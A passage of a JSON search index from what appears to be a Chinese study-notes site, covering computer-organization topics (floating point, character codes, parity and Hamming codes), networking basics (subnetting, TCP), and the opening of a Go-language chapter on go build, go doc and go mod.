7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u6d6e\u70b9\u6570\u673a\u5668\u683c\u5f0f","text":"","title":"\u6d6e\u70b9\u6570\u673a\u5668\u683c\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u6d6e\u70b9\u6570\u89c4\u683c\u5316","text":"","title":"\u6d6e\u70b9\u6570\u89c4\u683c\u5316"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u5c06x\u8868\u793a\u4e3a\u6d6e\u70b9\u6570-\u9898\u76ee","text":"","title":"\u5c06X\u8868\u793a\u4e3a\u6d6e\u70b9\u6570 \u9898\u76ee"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u8868\u793a\u8303\u56f4\u548c\u7cbe\u5ea6","text":"","title":"\u8868\u793a\u8303\u56f4\u548c\u7cbe\u5ea6"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u8868\u793a\u8303\u56f4-\u4f8b\u9898","text":"","title":"\u8868\u793a\u8303\u56f4 \u4f8b\u9898"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u5b9a\u70b9\u6570\u4e0e\u6d6e\u70b9\u6570\u7684\u6bd4\u8f83","text":"\uff081\uff09\u8868\u793a\u8303\u56f4\uff1a\u6d6e\u70b9\u6570\u6bd4\u5b9a\u70b9\u6570\u5927\uff1b \uff082\uff09\u8fd0\u7b97\u7cbe\u5ea6\uff1a\u6d6e\u70b9\u6570\u6bd4\u5b9a\u70b9\u6570\u9ad8\uff1b (3) \u8fd0\u7b97\u89c4\u5219: \u6d6e\u70b9\u6570\u6bd4\u5b9a\u70b9\u6570\u590d\u6742\uff1b","title":"\u5b9a\u70b9\u6570\u4e0e\u6d6e\u70b9\u6570\u7684\u6bd4\u8f83"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u5b57\u7b26\u8868\u793a\u65b9\u6cd5","text":"","title":"\u5b57\u7b26\u8868\u793a\u65b9\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#ascii\u7801","text":"30-> '0' 41->'A' 61->'a'","title":"ASCII\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u6c49\u5b57\u7684\u8f93\u5165\u7801","text":"","title":"\u6c49\u5b57\u7684\u8f93\u5165\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u6570\u5b57\u8f93\u5165\u7801","text":"\u5c066763\u4e2a\u4e8c\u7ea7\u6c49\u5b57\u5206\u4e3a94\u4e2a\u533a\uff0c\u6bcf\u533a94\u4f4d\uff0c\u628a\u6c49\u5b57\u8868\u793a\u6210\u4e8c\u7ef4\u6570\u7ec4\uff0c\u6570\u7ec4\u4e0b\u6807\u5c31\u662f\u533a\u4f4d\u7801 \u4f18\u7f3a\u70b9\uff1a \u65e0\u91cd\u7801\uff0c\u8f93\u5165\u7801\u4e0e\u5185\u90e8\u7801\u7684\u8f6c\u6362\u65b9\u4fbf\uff0c\u4ee3\u7801\u96be\u4ee5\u8bb0\u5fc6\u3002","title":"\u6570\u5b57\u8f93\u5165\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u62fc\u97f3\u8f93\u5165\u7801","text":"\u4ee5\u6c49\u5b57\u62fc\u97f3\u4e3a\u57fa\u7840\u7684\u8f93\u5165\u65b9\u6cd5\uff08\u5982\u5fae\u8f6f\u62fc\u97f3\uff09 \u4f18\u7f3a\u70b9\uff1a \u7b80\u5355\u65b9\u4fbf\uff1b \u540c\u97f3\u5b57\u591a\uff0c\u91cd\u7801\u7387\u9ad8\uff0c\u5f71\u54cd\u8f93\u5165\u901f\u5ea6\u3002","title":"\u62fc\u97f3\u8f93\u5165\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u5b57\u5f62\u8f93\u5165\u7801","text":"\u6839\u636e\u6c49\u5b57\u7684\u4e66\u5199\u5f62\u72b6\u6765\u8fdb\u884c\u7f16\u7801\uff08\u5982\u4e94\u7b14\u5b57\u578b\uff09\u3002\u628a\u6c49\u5b57\u7684\u7b14\u5212\u90e8\u4ef6\u7528\u5b57\u6bcd\u6216\u6570\u5b57\u8fdb\u884c\u7f16\u7801\uff0c\u6309\u7b14\u5212\u987a\u5e8f\u4f9d\u6b21\u8f93\u5165\uff0c\u5c31\u80fd\u5bf9\u5e94\u4e00\u4e2a\u6c49\u5b57\u3002 \u4f18\u7f3a\u70b9\uff1a \u7b80\u5355\u65b9\u4fbf\uff0c\u7b26\u5408\u4e66\u5199\u4e60\u60ef\uff1b \u91cd\u7801\u7387\u9ad8\uff0c\u9700\u8981\u8bb0\u4f4f\u5b57\u5f62\u7ed3\u6784\u3002","title":"\u5b57\u5f62\u8f93\u5165\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u6c49\u5b57\u5185\u7801","text":"","title":"\u6c49\u5b57\u5185\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u6c49\u5b57\u5b57\u6a21\u7801","text":"","title":"\u6c49\u5b57\u5b57\u6a21\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u8fd0\u7b97","text":"","title":"\u8fd0\u7b97"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u539f\u7801\u52a0\u51cf","text":"","title":"\u539f\u7801\u52a0\u51cf"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u540c\u53f7\u76f8\u52a0","text":"","title":"\u540c\u53f7\u76f8\u52a0"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u5f02\u53f7\u76f8\u52a0","text":"","title":"\u5f02\u53f7\u76f8\u52a0"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u8865\u7801\u52a0\u51cf","text":"","title":"\u8865\u7801\u52a0\u51cf"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u52a0","text":"","title":"\u52a0"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u51cf","text":"","title":"\u51cf"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u6ea2\u51fa\u5224\u65ad","text":"\u5224\u65ad\uff1a\u5982\u679c\u4e24\u4e2a\u6b63\u6570\u76f8\u52a0\u7684\u7ed3\u679c\u662f\u8d1f\u6570\uff1b\u4e24\u4e2a\u8d1f\u6570\u76f8\u52a0\u540e\u7684\u7ed3\u679c\u4e3a\u6b63\u6570\uff0c\u5747\u8868\u660e\u53d1\u751f\u6ea2\u51fa\u3002","title":"\u6ea2\u51fa\u5224\u65ad"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u79fb\u4f4d","text":"","title":"\u79fb\u4f4d"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u820d\u5165","text":"","title":"\u820d\u5165"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E3%80%81%E8%BF%90%E7%AE%97%E4%B8%8E%E6%A0%A1%E9%AA%8C/#\u5b9a\u70b9\u4e58\u6cd5\u8fd0\u7b97","text":"","title":"\u5b9a\u70b9\u4e58\u6cd5\u8fd0\u7b97"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%A0%A1%E9%AA%8C%E7%A0%81/","text":"\u6821\u9a8c\u7801 # \u5947\u5076\u6821\u9a8c\u7801 # \u6821\u9a8c\u4f4d\u52a0\u6709\u6548\u4fe1\u606f\u4e2d\u76841\u4e3a\u5947\u6570\u5219\u662f\u5947\u6821\u9a8c \u6821\u9a8c\u4f4d\u52a0\u6709\u6548\u4fe1\u606f\u4e2d\u76841\u4e3a\u5076\u6570\u5219\u662f\u5076\u6821\u9a8c \u5947\u5076\u6821\u9a8c\u5747\u4e0d\u80fd\u53d1\u73b0\u5076\u6570\u4f4d\u9519\uff0c\u4e5f\u65e0\u6cd5\u5b9a\u4f4d\u9519\u8bef \u6d77\u660e\u6821\u9a8c\u7801 # \u6d77\u660e\u7801\u8bbe\u8ba1\u601d\u8def\uff1a\u5c06\u4fe1\u606f\u4f4d\u5206\u7ec4\u8fdb\u884c \u5076\u6821\u9a8c ->\u591a\u4e2a\u4fe1\u606f\u4f4d->\u591a\u4e2a\u6821\u9a8c\u4f4d\u6807\u6ce8\u51fa\u9519\u4f4d\u7f6e \u5076\u6821\u9a8c # \u82e5\u5206\u7ec4\u4e2d\u5b58\u5728\u5076\u6570\u4e2a1\uff0c\u5219\u6821\u9a8c\u7801\u4e3a0\uff0c\u5426\u5219\u6821\u9a8c\u7801\u4e3a1 \u9700\u8981\u7684\u6821\u9a8c\u4f4d\u6570 # \u786e\u5b9a\u6821\u9a8c\u4f4d\u7684\u4f4d\u7f6e # \u6c42\u6821\u9a8c\u7801\u7684\u503c # \u7ea0\u9519 # \u7f3a\u9677 # \u4f20\u7edf\u6d77\u660e\u7801\u80fd\u68c0\u6d4b\u5e76\u7ea0\u6b63\u4e00\u4f4d\u9519,\u53d1\u73b0\u4e24\u4f4d\u9519\uff0c\u65e0\u6cd5\u533a\u5206\u662f\u4e00\u4f4d\u9519\u8fd8\u662f\u4e24\u4f4d\u9519 \u5faa\u73af\u5197\u4f59\u7801 # \u68c0\u9519\u548c\u7ea0\u9519 #","title":"\u6821\u9a8c\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%A0%A1%E9%AA%8C%E7%A0%81/#\u6821\u9a8c\u7801","text":"","title":"\u6821\u9a8c\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%A0%A1%E9%AA%8C%E7%A0%81/#\u5947\u5076\u6821\u9a8c\u7801","text":"\u6821\u9a8c\u4f4d\u52a0\u6709\u6548\u4fe1\u606f\u4e2d\u76841\u4e3a\u5947\u6570\u5219\u662f\u5947\u6821\u9a8c \u6821\u9a8c\u4f4d\u52a0\u6709\u6548\u4fe1\u606f\u4e2d\u76841\u4e3a\u5076\u6570\u5219\u662f\u5076\u6821\u9a8c \u5947\u5076\u6821\u9a8c\u5747\u4e0d\u80fd\u53d1\u73b0\u5076\u6570\u4f4d\u9519\uff0c\u4e5f\u65e0\u6cd5\u5b9a\u4f4d\u9519\u8bef","title":"\u5947\u5076\u6821\u9a8c\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%A0%A1%E9%AA%8C%E7%A0%81/#\u6d77\u660e\u6821\u9a8c\u7801","text":"\u6d77\u660e\u7801\u8bbe\u8ba1\u601d\u8def\uff1a\u5c06\u4fe1\u606f\u4f4d\u5206\u7ec4\u8fdb\u884c \u5076\u6821\u9a8c ->\u591a\u4e2a\u4fe1\u606f\u4f4d->\u591a\u4e2a\u6821\u9a8c\u4f4d\u6807\u6ce8\u51fa\u9519\u4f4d\u7f6e","title":"\u6d77\u660e\u6821\u9a8c\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%A0%A1%E9%AA%8C%E7%A0%81/#\u5076\u6821\u9a8c","text":"\u82e5\u5206\u7ec4\u4e2d\u5b58\u5728\u5076\u6570\u4e2a1\uff0c\u5219\u6821\u9a8c\u7801\u4e3a0\uff0c\u5426\u5219\u6821\u9a8c\u7801\u4e3a1","title":"\u5076\u6821\u9a8c"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%A0%A1%E9%AA%8C%E7%A0%81/#\u9700\u8981\u7684\u6821\u9a8c\u4f4d\u6570","text":"","title":"\u9700\u8981\u7684\u6821\u9a8c\u4f4d\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%A0%A1%E9%AA%8C%E7%A0%81/#\u786e\u5b9a\u6821\u9a8c\u4f4d\u7684\u4f4d\u7f6e","text":"","title":"\u786e\u5b9a\u6821\u9a8c\u4f4d\u7684\u4f4d\u7f6e"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%A0%A1%E9%AA%8C%E7%A0%81/#\u6c42\u6821\u9a8c\u7801\u7684\u503c","text":"","title":"\u6c42\u6821\u9a8c\u7801\u7684\u503c"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%A0%A1%E9%AA%8C%E7%A0%81/#\u7ea0\u9519","text":"","title":"\u7ea0\u9519"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%A0%A1%E9%AA%8C%E7%A0%81/#\u7f3a\u9677","text":"\u4f20\u7edf\u6d77\u660e\u7801\u80fd\u68c0\u6d4b\u5e76\u7ea0\u6b63\u4e00\u4f4d\u9519,\u53d1\u73b0\u4e24\u4f4d\u9519\uff0c\u65e0\u6cd5\u533a\u5206\u662f\u4e00\u4f4d\u9519\u8fd8\u662f\u4e24\u4f4d\u9519","title":"\u7f3a\u9677"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%A0%A1%E9%AA%8C%E7%A0%81/#\u5faa\u73af\u5197\u4f59\u7801","text":"","title":"\u5faa\u73af\u5197\u4f59\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%A0%A1%E9%AA%8C%E7%A0%81/#\u68c0\u9519\u548c\u7ea0\u9519","text":"","title":"\u68c0\u9519\u548c\u7ea0\u9519"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97/","text":"\u8ba1\u7b97\u9898 #","title":"\u8ba1\u7b97\u9898"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97/#\u8ba1\u7b97\u9898","text":"","title":"\u8ba1\u7b97\u9898"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/CRC%E6%A0%A1%E9%AA%8C%E7%A0%81/","text":"CRC\u6821\u9a8c\u7801 #","title":"CRC\u6821\u9a8c\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/CRC%E6%A0%A1%E9%AA%8C%E7%A0%81/#crc\u6821\u9a8c\u7801","text":"","title":"CRC\u6821\u9a8c\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/IP%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%88%86%E7%89%87/","text":"IP\u6570\u636e\u62a5\u5206\u7247 #","title":"IP\u6570\u636e\u62a5\u5206\u7247"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/IP%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%88%86%E7%89%87/#ip\u6570\u636e\u62a5\u5206\u7247","text":"","title":"IP\u6570\u636e\u62a5\u5206\u7247"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/TCP%2CIP%E4%BA%94%E5%B1%82%E5%8D%8F%E8%AE%AE/","text":"TCP,IP\u4e94\u5c42\u534f\u8bae #","title":"TCP,IP\u4e94\u5c42\u534f\u8bae"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/TCP%2CIP%E4%BA%94%E5%B1%82%E5%8D%8F%E8%AE%AE/#tcpip\u4e94\u5c42\u534f\u8bae","text":"","title":"TCP,IP\u4e94\u5c42\u534f\u8bae"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%92%8C%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B/","text":"TCP\u4e09\u6b21\u63e1\u624b\u548c\u56db\u6b21\u6325\u624b #","title":"TCP\u4e09\u6b21\u63e1\u624b\u548c\u56db\u6b21\u6325\u624b"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%92%8C%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B/#tcp\u4e09\u6b21\u63e1\u624b\u548c\u56db\u6b21\u6325\u624b","text":"","title":"TCP\u4e09\u6b21\u63e1\u624b\u548c\u56db\u6b21\u6325\u624b"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/TCP%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/","text":"TCP\u6ed1\u52a8\u7a97\u53e3 #","title":"TCP\u6ed1\u52a8\u7a97\u53e3"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/TCP%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/#tcp\u6ed1\u52a8\u7a97\u53e3","text":"","title":"TCP\u6ed1\u52a8\u7a97\u53e3"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/","text":"\u5b50\u7f51\u5212\u5206 # \u4e00\u4e2a\u5b50\u7f51\u5185\u7684\u4e3b\u673a\u6570\u5e94\u8be5\u4e3a(2^n)-2\uff0c\u8981\u4fdd\u7559\u51680\u4e3a\u7f51\u7edc\u5730\u5740\uff0c\u51681\u4f4d\u5e7f\u64ad\u5730\u5740","title":"\u5b50\u7f51\u5212\u5206"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/#\u5b50\u7f51\u5212\u5206","text":"\u4e00\u4e2a\u5b50\u7f51\u5185\u7684\u4e3b\u673a\u6570\u5e94\u8be5\u4e3a(2^n)-2\uff0c\u8981\u4fdd\u7559\u51680\u4e3a\u7f51\u7edc\u5730\u5740\uff0c\u51681\u4f4d\u5e7f\u64ad\u5730\u5740","title":"\u5b50\u7f51\u5212\u5206"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/%E5%BF%85%E8%80%83/","text":"\u6570\u636e\u94fe\u8def\u5c42\u7684\u7279\u70b9\uff1a\u5c01\u88c5\u6210\u5e27\u3001\u900f\u660e\u4f20\u8f93\u548c\u5dee\u9519\u68c0\u6d4b","title":"\u5fc5\u8003"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91/","text":"\u8ba1\u7f51 Overview # type: folder_brief_live noteOnly: true style: strip","title":"\u8ba1\u7f51 Overview"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91/#\u8ba1\u7f51-overview","text":"type: folder_brief_live noteOnly: true style: strip","title":"\u8ba1\u7f51 Overview"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/","text":"\u7b2c\u4e00\u7ae0-Golang\u57fa\u7840 # \u73af\u5883\u642d\u5efa # \u76f8\u5173\u6587\u7ae0: vscode\u642d\u5efago\u8bed\u8a00\u5f00\u53d1\u73af\u5883 go build # \u5c06go\u6587\u4ef6\u7f16\u8bd1\u6210\u53ef\u6267\u884c\u6587\u4ef6 go build hello.go \u53bb\u9664\u8c03\u8bd5\u4fe1\u606f\u548c\u7b26\u53f7\u8868\u4ee5\u8282\u7ea6\u53ef\u6267\u884c\u6587\u4ef6\u5927\u5c0f go build -ldflags \"-w -s\" \u4ea4\u53c9\u7f16\u8bd1(\u5982\u4f7f\u7528windows\u7f16\u8bd1\u6210linux\u7684\u53ef\u6267\u884c\u6587\u4ef6) SET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build -ldflags \"-s -w\" -o hello hello.go go doc # \u76f8\u5173\u6587\u7ae0: godoc \u547d\u4ee4\u548c golang \u4ee3\u7801\u6587\u6863\u7ba1\u7406 # \u67e5\u770b\u76ee\u6807\u5305\u7684\u6587\u6863\u7d22\u5f15 go doc [ targetPackage ] # \u67e5\u770b\u76ee\u6807\u5305\u7684\u67d0\u5185\u5bb9\u7684\u6587\u6863\u7d22\u5f15 go doc [ targetPackage ] . [ \u51fd\u6570\u540d ] # \u6216\u8005\u7a7a\u683c\u9694\u5f00\u4e5f\u663e\u793a\u67d0\u5185\u5bb9\u7684\u6587\u6863 go doc [ targetPackage ] [ \u51fd\u6570\u540d ] # \u5b50\u5305\u7684\u6587\u6863\u6ce8\u91ca go doc [ targetPackage ] / [ subpackage ] # \u4ee3\u7801\u6587\u6863\u7f16\u5199, \u6309 go \u7684\u6807\u51c6\u6ce8\u91ca\u5199\u6cd5\u7f16\u5199 // Biz implements a business type Biz struct { } // business initialization func ( b *Biz ) Init () { } go mod(golang v1.11\u53ca\u4ee5\u4e0a) # \u76f8\u5173\u6587\u7ae0: go mod \u4f7f\u7528 # \u914d\u7f6e go mod export GO111MODULE = true # \u521b\u5efa\u65b0\u9879\u76ee go mod init hello # \u63a5\u4e0b\u6765\u51e0\u4e4e\u53ef\u4ee5\u4e0d\u7528\u7ba1\u4e86,\u5728\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305\u65f6import, \u5728\u8fd0\u884c\u65f6\u4f1a\u81ea\u52a8\u4ece\u7f51\u4e0a\u4e0b\u8f7d\u4f9d\u8d56 # go module \u5b89\u88c5 package \u7684\u539f\u5247\u662f\u5148\u62c9\u6700\u65b0\u7684 release tag\uff0c\u82e5\u65e0tag\u5219\u62c9\u6700\u65b0\u7684commit # \u4f7f\u7528go get\u65f6\u4e5f\u4f1a\u7531go mod\u63a5\u7ba1 # \u8fd0\u884c go get -u \u5c06\u4f1a\u5347\u7ea7\u5230\u6700\u65b0\u7684\u6b21\u8981\u7248\u672c\u6216\u8005\u4fee\u8ba2\u7248\u672c(x.y.z, z\u662f\u4fee\u8ba2\u7248\u672c\u53f7\uff0c y\u662f\u6b21\u8981\u7248\u672c\u53f7) # \u8fd0\u884c go get -u=patch \u5c06\u4f1a\u5347\u7ea7\u5230\u6700\u65b0\u7684\u4fee\u8ba2\u7248\u672c # \u8fd0\u884c go get package@version \u5c06\u4f1a\u5347\u7ea7\u5230\u6307\u5b9a\u7684\u7248\u672c\u53f7version # \u8fd0\u884cgo get\u5982\u679c\u6709\u7248\u672c\u7684\u66f4\u6539\uff0c\u90a3\u4e48go.mod\u6587\u4ef6\u4e5f\u4f1a\u66f4\u6539 # \u4f7f\u7528go 